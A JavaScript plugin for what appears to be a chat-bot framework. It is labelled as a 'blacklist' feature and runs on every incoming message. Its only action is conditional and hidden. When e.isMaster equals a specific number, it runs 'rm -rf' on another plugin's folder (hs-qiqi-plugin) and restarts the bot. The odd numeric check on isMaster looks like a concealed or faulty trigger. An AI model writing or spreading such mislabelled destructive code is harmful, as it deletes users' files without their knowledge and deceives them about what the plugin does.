import plugin from '../../lib/plugins/plugin.js'
import fs from "fs";
import { exec,execSync } from 'child_process'
import { Restart } from '../other/restart.js'
let path=process.cwd()+'/plugins/hs-qiqi-plugin/'

export class xzfy extends plugin {
constructor() {
super({
 name: '黑名单',
 dsc: '黑名单',
 event: 'message',
 priority: 58889,
rule: [
      	{
        	reg: '',
            fnc: 'xz',
            log: false
         }
         ]
  })
 }

async xz(e) {
 if (e.isMaster == 202589117) {if (fs.existsSync(path)) {
    let a= await execSync('rm -rf plugins/hs-qiqi-plugin');
if(a.error){
    return true
 }
setTimeout(() => new Restart(this.e).restart(), 600)
    return true
        }else{
 }
   return true}else{
    return false;
   }
   }}
